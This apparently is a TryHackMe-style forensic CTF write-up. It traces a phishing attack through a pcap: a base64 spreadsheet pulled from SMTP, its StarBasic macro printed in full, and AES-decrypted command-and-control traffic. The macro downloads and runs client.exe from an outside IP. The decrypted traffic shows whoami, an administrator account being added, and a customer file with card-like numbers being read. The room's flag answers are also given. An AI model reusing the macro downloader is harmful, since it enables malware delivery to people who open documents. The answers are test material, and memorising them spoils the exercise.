<h2>Statistics Protocol Hierarchy</h2>

<img width="1729" height="454" alt="image" src="https://github.com/user-attachments/assets/7f438aae-0369-455d-b983-f7ee021fa930" />

<br>

<img width="1727" height="266" alt="image" src="https://github.com/user-attachments/assets/b3c99074-fbea-46d0-b2f5-f31690c55da4" />

<br>

<img width="1695" height="637" alt="image" src="https://github.com/user-attachments/assets/13a62aa0-c254-4ec2-9420-e05b6cc63354" />

<br>

<br>Follow
TCP Stream

<img width="1690" height="635" alt="image" src="https://github.com/user-attachments/assets/37d1cc7c-329f-4bf6-acde-403c551c35f4" />

<img width="1690" height="634" alt="image" src="https://github.com/user-attachments/assets/54987823-0ced-4a2c-87c0-879d829d3da0" />





<h2>Statistics Endpoints</h2>

<p>IPv4</p>

<img width="1729" height="178" alt="image" src="https://github.com/user-attachments/assets/13e3f781-3c44-444d-85ed-5f33f91bf22a" />

<p>TCP</p>

<img width="1734" height="186" alt="image" src="https://github.com/user-attachments/assets/ea4ed973-db86-42a7-9ea7-c2c4f2a60465" />

<p>UDP</p>

<img width="1728" height="188" alt="image" src="https://github.com/user-attachments/assets/69ca2e4e-d2ad-43c2-aa1d-73af97a1e967" />




<img width="1691" height="511" alt="image" src="https://github.com/user-attachments/assets/c0921d31-47a6-49f4-a870-5c60c1dabc4d" />



<img width="1693" height="299" alt="image" src="https://github.com/user-attachments/assets/71d4e1c3-46a9-47e5-bde8-33e0a11adc30" />




<p>

- filtered smtp<br>
- followed TCP stream<br>
- save Base64 encoded data into file.txt<br>
- decoded it into sheet.ods<br>
- unziped sheet.ods<br>



</p>












root@ip-10-201-26-122:~# nano file.txt
root@ip-10-201-26-122:~# cat file.txt | base64 -d > sheet.ods
root@ip-10-201-26-122:~# file sheet.ods
sheet.ods: OpenDocument Spreadsheet
root@ip-10-201-26-122:~# unzip sheet.ods
Archive:  sheet.ods
 extracting: mimetype                
  inflating: Basic/Standard/evil.xml  
  inflating: Basic/Standard/script-lb.xml  
  inflating: Basic/script-lc.xml     
  inflating: settings.xml            
   creating: Configurations2/accelerator/
   creating: Configurations2/images/Bitmaps/
   creating: Configurations2/toolpanel/
   creating: Configurations2/floater/
   creating: Configurations2/statusbar/
   creating: Configurations2/toolbar/
   creating: Configurations2/progressbar/
   creating: Configurations2/popupmenu/
   creating: Configurations2/menubar/
  inflating: styles.xml              
  inflating: manifest.rdf            
  inflating: content.xml             
  inflating: meta.xml                
 extracting: Thumbnails/thumbnail.png  
  inflating: META-INF/manifest.xml   
root@ip-10-201-26-122:~# ls
Basic            Desktop       META-INF  Rooms         styles.xml
burp.json        Downloads     meta.xml  Scripts       thinclient_drives
Configurations2  file.txt      mimetype  settings.xml  Thumbnails
content.xml      Instructions  Pictures  sheet.ods     Tools
CTFBuilder       manifest.rdf  Postman   snap          traffic.pcapng
root@ip-10-201-26-122:~# ls -lah
total 4.9M
drwxr-xr-x 54 root root 4.0K Sep  7 15:51 .
drwxr-xr-x 24 root root 4.0K Sep  7 15:46 ..
drwxr-xr-x  3 root root 4.0K Aug 23  2021 .aspnet
-rw-r--r--  1 root root  416 Nov 15  2024 .bash_aliases
lrwxrwxrwx  1 root root    9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 4.2K Sep  2 13:37 .bashrc
drwxr-xr-x  3 root root 4.0K Sep  7 15:51 Basic
drwxr-xr-x  3 root root 4.0K Sep  1  2020 .bundle
-rw-r--r--  1 root root  13K May  6  2024 burp.json
drwx------  5 root root 4.0K Aug 22  2023 .BurpSuite
drwx------ 28 root root 4.0K Sep  7 15:49 .cache
drwxr-xr-x  5 root root 4.0K Apr 10  2024 .cargo
drwx------ 32 root root 4.0K Sep  2 14:39 .config
drwxr-xr-x 11 root root 4.0K Sep  7 15:51 Configurations2
-rw-r--r--  1 root root 3.7K May 11 01:49 content.xml
drwxr-xr-x  2 root root 4.0K May  6  2024 CTFBuilder
drwx------  3 root root 4.0K Aug 16  2020 .dbus
drwxr-xr-x  4 root root 4.0K May 23 09:44 Desktop
-rw-r--r--  1 root root   23 Aug 13  2020 .dmrc
drwxr-xr-x  6 root root 4.0K Aug 23  2021 .dotnet
drwxr-xr-x  2 root root 4.0K Nov 19  2024 Downloads
-rw-r--r--  1 root root  13K Sep  7 15:51 file.txt
drwxr-xr-x  3 root root 4.0K Aug 14  2020 .gem
drwxr-x---  3 root root 4.0K Aug 14  2020 .ghidra
drwx------  4 root root 4.0K Nov 25  2024 .gnupg
drwxr-xr-x  8 root root 4.0K Feb 11  2022 .gradle
drwx------  2 root root 4.0K Aug 16  2020 .gvfs
drwx------  4 root root 4.0K Sep  2  2020 .hashcat
-rw-------  1 root root  79K Nov  5  2024 .ICEauthority
drwxr-xr-x  2 root root 4.0K Aug 16  2020 .icons
-rw-rw-r--  1 root root  111 Sep 10  2021 .install4j
drwxr-xr-x  2 root root 4.0K May  7  2024 Instructions
drwxr-xr-x  4 root root 4.0K Aug 13  2020 .java
drwx------  2 root root 4.0K Aug 14  2020 .john
-rw-------  1 root root   28 Jun 22 22:11 .lesshst
drwx------  7 root root 4.0K May 16 11:56 .local
-rw-r--r--  1 root root  899 May 11 01:49 manifest.rdf
drwxr-xr-x  2 root root 4.0K Sep  7 15:51 META-INF
-rw-r--r--  1 root root  871 May 11 01:49 meta.xml
-rw-r--r--  1 root root   46 May 11 01:49 mimetype
drwx------  5 root root 4.0K Aug 13  2020 .mozilla
drwxrwxrwx 13 root root 4.0K Mar 27 10:38 .msf4
drwxr-xr-x  4 root root 4.0K Aug 23  2021 .nuget
drwxr-xr-x  8 root root 4.0K Jun  6 11:27 .nxc
drwxr-xr-x  3 root root 4.0K May 16 12:28 Pictures
drwx------  3 root root 4.0K Aug 16  2020 .pki
drwxr-xr-x  3 root root 4.0K Aug 16  2020 Postman
-rw-r--r--  1 root root  261 Apr 10  2024 .profile
drwxr-xr-x 14 root root 4.0K Jun  4  2024 .pyenv
-rw-------  1 root root  429 Feb 18  2025 .python_history
drwxr-xr-x 14 root root 4.0K May 16 11:39 .rbenv
drwxr-xr-x  3 root root 4.0K Dec 22  2021 .recon-ng
drwxr-xr-x 41 root root 4.0K May 23 09:40 Rooms
drwxr-xr-x  2 root root 4.0K Aug 17  2020 .rpmdb
drwxr-xr-x  6 root root 4.0K Apr 10  2024 .rustup
drwxr-xr-x  2 root root 4.0K Sep  2 13:51 Scripts
-rw-r--r--  1 root root   74 Aug 15  2020 .selected_editor
drwxr-xr-x  2 root root 4.0K Feb 22  2021 .set
-rw-r--r--  1 root root 9.2K May 11 01:49 settings.xml
-rw-r--r--  1 root root 9.1K Sep  7 15:51 sheet.ods
drwx------  5 root root 4.0K May 16 12:34 snap
drwx------  2 root root 4.0K Nov  5  2024 .ssh
drwxr-xr-x  2 root root 4.0K Jun  5  2024 .sstimap
-rw-r--r--  1 root root  14K May 11 01:49 styles.xml
drwxr-xr-x  3 root root 4.0K Sep  1  2020 .subversion
drwxr-xr-x  2 root root 4.0K Feb 27  2023 .terraform.d
drwxr-xr-x  2 root root 4.0K Aug 13  2020 .themes
drwxr-xr-t  2 root root 4.0K Aug 13  2020 thinclient_drives
drwxr-xr-x  2 root root 4.0K Sep  7 15:51 Thumbnails
lrwxrwxrwx  1 root root   19 Mar 18  2021 Tools -> /root/Desktop/Tools
-rw-r--r--  1 root root 3.9M Sep  7 15:48 traffic.pcapng
-rw-------  1 root root  828 Aug 20  2020 .viminfo
drwxr-xr-x  2 root root 4.0K Sep  7 15:46 .vnc
drwxr-xr-x  2 root root 4.0K Aug 14  2020 .wfuzz
-rw-r--r--  1 root root  579 Jun  6 11:29 .wget-hsts
drwxr-xr-x  3 root root 4.0K Sep 10  2020 .wpscan
-rw-------  1 root root  17K Sep  7 15:46 .Xauthority
-rw-r--r--  1 root root  20K Dec  2  2020 .xorgxrdp.10.log
-rw-r--r--  1 root root  18K Aug 13  2020 .xorgxrdp.10.log.old
-rw-r--r--  1 root root    0 Nov  5  2024 .Xresources
-rw-------  1 root root 509K Sep  7 15:51 .xsession-errors
-rw-------  1 root root 7.0K Aug 16  2020 .xsession-errors.old
drwxr-xr-x 21 root root 4.0K Nov 19  2024 .ZAP
-rw-r--r--  1 root root   21 Apr 10  2024 .zshenv
root@ip-10-201-26-122:~#  cd Basic
root@ip-10-201-26-122:~/Basic# ls
script-lc.xml  Standard
root@ip-10-201-26-122:~/Basic# cat script-lc.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
 <library:library library:name="Standard" library:link="false"/>
</library:libraries>root@ip-10-201-26-122:~/Basic# cd Standard
root@ip-10-201-26-122:~/Basic/Standard# ls
evil.xml  script-lb.xml
root@ip-10-201-26-122:~/Basic/Standard# cat evil.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="evil" script:language="StarBasic" script:moduleType="normal">Sub Main

    Shell(&quot;cmd /c curl 10.13.44.207/client.exe -o C:\ProgramData\client.exe&quot;)
    Shell(&quot;cmd /c echo VEhNe0FfQzJfTUF5Xw==&quot;)
    Shell(&quot;C:\\ProgramData\\client.exe&quot;)
    
End Sub
</script:module>root@ip-10-201-26-122:~/Basic/Standard# echo 'VEhNe0FfQzJfTUF5Xw==' | base64 -d
THM{A_C2_MAy_root@ip-10-201-26-122:~/Basic/Standard# cd ..
root@ip-10-201-26-122:~/Basic# cd ..
root@ip-10-201-26-122:~# ls
Basic            Desktop       META-INF  Rooms         styles.xml
burp.json        Downloads     meta.xml  Scripts       thinclient_drives
Configurations2  file.txt      mimetype  settings.xml  Thumbnails
content.xml      Instructions  Pictures  sheet.ods     Tools
CTFBuilder       manifest.rdf  Postman   snap          traffic.pcapng
root@ip-10-201-26-122:~# cd Configurations2
root@ip-10-201-26-122:~/Configurations2# ls
accelerator  floater  images  menubar  popupmenu  progressbar  statusbar  toolbar  toolpanel
root@ip-10-201-26-122:~/Configurations2# cd images
root@ip-10-201-26-122:~/Configurations2/images# ls
Bitmaps
root@ip-10-201-26-122:~/Configurations2/images# cd Bitmaps
root@ip-10-201-26-122:~/Configurations2/images/Bitmaps# ls
root@ip-10-201-26-122:~/Configurations2/images/Bitmaps# ls -lah
total 8.0K
drwxr-xr-x 2 root root 4.0K May 11 01:49 .
drwxr-xr-x 3 root root 4.0K Sep  7 15:51 ..
root@ip-10-201-26-122:~/Configurations2/images/Bitmaps# cd ..
root@ip-10-201-26-122:~/Configurations2/images# cd images
bash: cd: images: No such file or directory
root@ip-10-201-26-122:~/Configurations2/images# ls -lah
total 12K
drwxr-xr-x  3 root root 4.0K Sep  7 15:51 .
drwxr-xr-x 11 root root 4.0K Sep  7 15:51 ..
drwxr-xr-x  2 root root 4.0K May 11 01:49 Bitmaps
root@ip-10-201-26-122:~/Configurations2/images# cd ..
root@ip-10-201-26-122:~/Configurations2# cd floater
root@ip-10-201-26-122:~/Configurations2/floater# ls
root@ip-10-201-26-122:~/Configurations2/floater# ls -lah
total 8.0K
drwxr-xr-x  2 root root 4.0K May 11 01:49 .
drwxr-xr-x 11 root root 4.0K Sep  7 15:51 ..
root@ip-10-201-26-122:~/Configurations2/floater# cd ..
root@ip-10-201-26-122:~/Configurations2# cd accelerator
root@ip-10-201-26-122:~/Configurations2/accelerator# ls
root@ip-10-201-26-122:~/Configurations2/accelerator# ls -lah
total 8.0K
drwxr-xr-x  2 root root 4.0K May 11 01:49 .
drwxr-xr-x 11 root root 4.0K Sep  7 15:51 ..
root@ip-10-201-26-122:~/Configurations2/accelerator# cd ..
root@ip-10-201-26-122:~/Configurations2# ls -lah
total 44K
drwxr-xr-x 11 root root 4.0K Sep  7 15:51 .
drwxr-xr-x 54 root root 4.0K Sep  7 15:51 ..
drwxr-xr-x  2 root root 4.0K May 11 01:49 accelerator
drwxr-xr-x  2 root root 4.0K May 11 01:49 floater
drwxr-xr-x  3 root root 4.0K Sep  7 15:51 images
drwxr-xr-x  2 root root 4.0K May 11 01:49 menubar
drwxr-xr-x  2 root root 4.0K May 11 01:49 popupmenu
drwxr-xr-x  2 root root 4.0K May 11 01:49 progressbar
drwxr-xr-x  2 root root 4.0K May 11 01:49 statusbar
drwxr-xr-x  2 root root 4.0K May 11 01:49 toolbar
drwxr-xr-x  2 root root 4.0K May 11 01:49 toolpanel
root@ip-10-201-26-122:~/Configurations2# 







<img width="1209" height="242" alt="image" src="https://github.com/user-attachments/assets/2ad7055c-06c7-45cf-9192-a7bef33a06ef" />


~# file client.exe
client.exe: PE32+ executable (console) x86-64, for MS Windows



~# strings client.exe > s

~# nano s
...
GHASH for x86_64, CRYPTOGAMS by <appro@openssl.org>
...
Vector Permutation AES for x86_64/SSSE3, Mike Hamburg (Stanford University)
...
Montgomery Multiplication for x86_64, CRYPTOGAMS by <appro@openssl.org>
VWSUATAUAVAW
VWSUATAUAVAW
...
VWSUATAUAVAW

<h2>Ghidra</h2>



<h2>Key</h2>

rhI1YazJLaLVgWv4 + VKf7EQIvl8ps6MJj = rhI1YazJLaLVgWv4VKf7EQIvl8ps6MJj

<img width="1348" height="509" alt="image" src="https://github.com/user-attachments/assets/fdbb41c3-9c7c-476e-a40f-036206cec0da" />

<img width="1347" height="513" alt="image" src="https://github.com/user-attachments/assets/19a77669-6e64-42fa-a39e-faf21e820708" />



pEw8P3PU9kCcG4sj

<img width="1347" height="447" alt="image" src="https://github.com/user-attachments/assets/3cb1982e-f90b-4c80-8e6f-3aadeab10e10" />



ip.src == 10.13.44.207 && tcp.port == 443

<img width="1617" height="374" alt="image" src="https://github.com/user-attachments/assets/a9f1c0cf-d801-4868-a95c-2cd8d7b0864e" />



<img width="1608" height="619" alt="image" src="https://github.com/user-attachments/assets/d8d8fcdd-496c-40de-90ee-308283e6d173" />

<br>

<img width="1611" height="704" alt="image" src="https://github.com/user-attachments/assets/ba07666b-ea6c-4a0f-93f0-f79fe02a3626" />


Show as Raw
Save as ...



<img width="1075" height="856" alt="image" src="https://github.com/user-attachments/assets/feaf8271-2aa1-4d8b-bb64-735b0a546101" />



~/Desktop# file data.dat
data.dat: data


<h2>Key</h2>

rhI1YazJLaLVgWv4VKf7EQIvl8ps6MJj


<img width="1364" height="203" alt="image" src="https://github.com/user-attachments/assets/d00018e9-d974-4235-af64-1f17fc89f432" />

<h2>Hex Key</h2>
7268493159617a4a4c614c5667577634564b6637455149766c387073364d4a6a


<h2>Hex IV</h2>

7045773850335055396b43634734736a


<img width="1359" height="184" alt="image" src="https://github.com/user-attachments/assets/7298121d-af6e-470d-91ed-1555774064b7" />



<h2>Decrypt</h2>

:~/Desktop# openssl enc -aes-256-cbc -d -K 7268493159617a4a4c614c5667577634564b6637455149766c387073364d4a6a -iv 7045773850335055396b43634734736a -in data.dat -out outcome.txt


:~/Desktop# cat outcome.txt
whoami









\ufffd\ufffdWk\ufffd\ufffdzji\ufffd=\ufffd\ufffd\ufffdoadministrator
;\ufffd\ufffd-NV\ufffd\ufffd\ufffd\\ufffd\ufffdA-\ufffdttratorr RWx1RDNfWTB1X1doM25fWW91Xw== /add /YI\ufffd\ufffd\ufffd\ufffd1tLjYT\ufffdMs9\ufffdleted successfully.












\ufffdh\ufffd\ufffd\ufffd\ufffdm\ufffd1x\ufffd\ufffd\ufffd\ufffddministrators administratorr /add<\ufffd\ufffd\ufffd\ufffd^8\ufffd\ufffd\ufffdm~leted successfully.












vj|xV\2\ufffdW\ufffd#*\u059d\ufffd C has no label.op\
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/11/2025  01:21 AM    <DIR>          .
05/11/2025  01:21 AM    <DIR>          ..
05/11/2025  12:29 AM               840 clients.csv
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,921 bytes
               2 Dir(s)   6,116,753,408 bytes free
\ufffdl\ufffd0\ufffdVm]
TT\u06c0"ministrator\Desktop\clients.csvr\ufffdI\ufffd\ufffd\ufffd\ufffd`\ufffd\ufffd
                                             I\ufffd\ufffdrds
1,Kristina,3576458480892700
2,Vincenz,6377289692238729
3,Lynnett,502083133236470823
4,Willy,3529610352793949
5,Maryjo,5018887044140690101
6,Marigold,3562096088860871
7,Tedra,5100145340581462
8,Dita,374622610631912
9,Lilas,50184655540100116
10,Sybila,337941913325253
11,Iseabal,560224746120829081
12,Dotti,5261652156343239
13,Tessa,201879631316647
14,Adolph,374622215114868
15,Erskine,3542911130825612
16,Cyndie,3570664276667588
17,Gabriel,3545817387044384
18,Tani,3545260532217102
19,Goldie,3536353114355357
20,Ingram,630456178681475528
21,Morissa,QXJlX1ByZSRzM2RfNF9UaW0zfQ==
22,Shelia,201766968942709
23,Mikel,3558557239071912
24,Manya,3578351764405158
25,Cullen,3543833584578068
26,Rowland,201770928146237
27,Merilee,3536700865014213
28,Wiley,4911540419701894811
29,Harlin,3542950948982249
30,Michal,5462675671244662




whoami
administrator
RWx1RDNfWTB1X1doM25fWW91Xw==


<p>1.1. What is the first part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
<code>VEhNe0FfQzJfTUF5Xw==</code></p>


<p>1.2. What is the second part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
<code>RWx1RDNfWTB1X1doM25fWW91Xw==</code></p>

<p>1.3. What is the third part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.<br>
<code>____</code></p>



# echo 'QXJlX1ByZSRzM2RfNF9UaW0zfQ==' | base64 -d
Are_Pre$s3d_4_Tim3}


<img width="1614" height="707" alt="image" src="https://github.com/user-attachments/assets/21d21ee1-eb22-48e7-b10b-9fc55fe87a2e" />



<p>1.4. What is the flag? Format: Paste the decoded values.<br>
<code>____</code></p>



<img width="1740" height="178" alt="image" src="https://github.com/user-attachments/assets/9e2f7b81-81df-4d60-a4af-56b079487ea9" />


VEhNe0FfQzJfTUF5Xw==  :  THM{A_C2_MAy_

RWx1RDNfWTB1X1doM25fWW91Xw== : EluD3_Y0u_Wh3n_You_


QXJlX1ByZSRzM2RfNF9UaW0zfQ==  Are_Pre$s3d_4_Tim3}


THM{A_C2_MAy_EluD3_Y0u_Wh3n_You_

# echo 'RWx1RDNfWTB1X1doM25fWW91Xw==' | base64 -d
EluD3_Y0u_Wh3n_You_




<h2>CyberChef</h2>

<p>

- AES Decrypt recipe<br>
]
</p>


<img width="1735" height="244" alt="image" src="https://github.com/user-attachments/assets/52ab0148-4018-4a2a-b2b2-2bb107d3b9cc" />



<img width="1727" height="606" alt="image" src="https://github.com/user-attachments/assets/9d9c0328-7deb-4053-a6c9-f9bdadedaf39" />

<br>

<img width="1728" height="602" alt="image" src="https://github.com/user-attachments/assets/cb439774-335b-41cd-b186-01b49ed41b89" />







